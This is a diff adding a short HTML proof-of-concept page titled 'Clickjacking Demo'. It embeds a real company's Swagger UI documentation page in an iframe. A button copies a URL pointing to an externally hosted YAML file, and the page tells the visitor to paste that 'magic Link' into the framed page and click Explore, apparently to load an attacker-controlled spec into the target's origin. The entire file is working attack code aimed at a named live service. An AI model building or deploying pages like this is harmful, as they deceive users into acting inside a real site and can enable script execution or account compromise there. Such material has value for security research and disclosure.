@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking Demo</title>
+    <style>
+        iframe {
+            width: 100%;
+            height: 500px;
+            border: 1px solid black;
+            margin-bottom: 20px;
+        }
+        #url-box {
+            width: 200px;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+   
+    <button onclick="copyToClipboard()">Click me to Copy Magic Link</button>
+    <br><br>
+
+    <h2>Paste the magic Link Below and Click Explore</h2>
+    
+    <iframe id="domainB" src="https://api.cpms.silabs.com/documentation/static/index.html"></iframe>
+
+    <script>
+        // Function to copy the URL to clipboard without redirecting
+        function copyToClipboard() {
+            let url = "https://justluthra.github.io/justluthra/x.yaml"; 
+
+            // Copy the URL to the clipboard
+            navigator.clipboard.writeText(url).then(function() {
+                console.log('URL copied to clipboard');
+            }, function(err) {
+                console.error('Failed to copy text: ', err);
+            });
+        }
+    </script>
+</body>
+</html>
